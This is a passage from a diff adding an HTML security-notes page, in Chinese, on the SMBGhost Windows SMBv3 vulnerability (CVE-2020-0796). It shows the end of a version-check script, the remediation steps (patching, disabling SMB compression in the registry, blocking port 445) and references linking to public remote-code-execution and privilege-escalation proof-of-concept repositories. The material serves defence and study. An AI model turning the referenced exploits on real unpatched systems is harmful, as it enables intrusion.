+<span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> !<span class="o">=</span> <span class="m">0</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+    <span class="nb">echo</span> <span class="s2">&quot;There&#39;s no SMB v3.11&quot;</span>
+<span class="k">fi</span>
+</pre></div>
+
+
+<h3 id="_7">七、漏洞修复<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<p>更新，完成补丁的安装。</p>
+<p>操作步骤：设置­>更新和安全­>Windows更新，点击"检查更新"。</p>
+<p>微软给出了临时的应对办法：</p>
+<p>运行regedit.exe，打开注册表编辑器，在HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters建立一个名为DisableCompression的DWORD，值为1，禁止SMB的压缩功能。</p>
+<p>对SMB通信445端口进行封禁。</p>
+<p>补丁链接<a href="https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4551762">https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4551762</a></p>
+<h3 id="_8">八、参考连接<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p><a href="https://www.cnblogs.com/A66666/p/29635a243378b49ccb485c7a280df989.html">https://www.cnblogs.com/A66666/p/29635a243378b49ccb485c7a280df989.html</a>>
+<a href="https://github.com/danigargu/CVE">https://github.com/danigargu/CVE</a>­2020­0796
+<a href="http://dl.qianxin.com/skylar6">http://dl.qianxin.com/skylar6</a> <a href="https://github.com/ollypwn/SMBGhost">https://github.com/ollypwn/SMBGhost</a>
+<a href="https://github.com/chompie1337/SMBGhost">https://github.com/chompie1337/SMBGhost</a>_RCE_PoC
+<a href="https://github.com/danigargu/CVE">https://github.com/danigargu/CVE</a>­2020­0796
+<a href="https://blog.zecops.com/vulnerabilities/exploiting">https://blog.zecops.com/vulnerabilities/exploiting</a>­smbghost­cve­2020­0796­for­a­local­privilege­escalation­writeup­and­poc/</p>
+</blockquote>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../（CVE-2019-0708） Windows 远程溢出漏洞/" title="（CVE 2019 0708） Windows 远程溢出漏洞" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  后退
+                </span>
+                （CVE 2019 0708） Windows 远程溢出漏洞
+              </span>
+            </div>
+          </a>
+        
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+        
+  <div class="md-footer-social">
+    <link rel="stylesheet" href="../../../../assets/fonts/font-awesome.css">
+    
+      <a href="https://github.com/root-iceH" class="md-footer-social__link fa fa-"></a>
+    
+  </div>
+
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../../assets/javascripts/application.5e60981f.js"></script>
+      
+        
+        
+          
+          <script src="../../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+                <script src="../../../../assets/javascripts/lunr/tinyseg.js"></script>
+              
+              
+                <script src="../../../../assets/javascripts/lunr/lunr.jp.js"></script>
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"1.0",url:{base:"../../../.."}})</script>
+      
+    
+    
+      
+    
+  </body>
+</html>
